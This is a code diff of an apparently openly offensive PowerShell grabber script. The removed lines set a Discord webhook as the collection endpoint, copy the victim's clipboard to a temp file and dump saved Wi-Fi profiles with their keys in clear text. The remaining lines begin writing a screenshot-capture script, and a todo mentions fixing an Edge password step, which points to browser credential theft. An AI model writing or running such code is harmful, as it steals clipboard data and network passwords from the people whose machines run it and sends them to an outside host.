@@ -4,24 +4,7 @@
 #Todo:
 # Correct the Edge password error
 
-#CHANGE URL TO YOUR URL
-  $url="https://discordapp.com/api/webhooks/1276939414802661416/CtTddz1AtVvnChDRmgjQXY_uFh1763abx3cSbWIPeYfXCppzk8kM62IlxaTPIF6T6Y88on" ;
-#Get PC Name+Date+Time
-  $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
-
-# Get PC ClipBoard
-  echo "" > "$env:temp\stats-$namepc.txt";
-  echo "####PC ClipBoard under this line:" >> "$env:temp\stats-$namepc.txt";
-  echo "####################################" >> "$env:temp\stats-$namepc.txt";
-  Get-Clipboard >> "$env:temp\stats-$namepc.txt";
-  echo "####################################" >> "$env:temp\stats-$namepc.txt";
-  echo "####End ClipBoard" >> "$env:temp\stats-$namepc.txt";
-
-# Get WifiPassword
-echo "" > "$env:temp\WIFI-$namepc.txt";
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\WIFI-$namepc.txt";
-
-# Screenshot
+#CHANGE URL TO YOUR URLe
   cd "$env:temp";
   echo 'function Get-ScreenCapture' > "d.ps1";
   echo '{' >> "d.ps1";
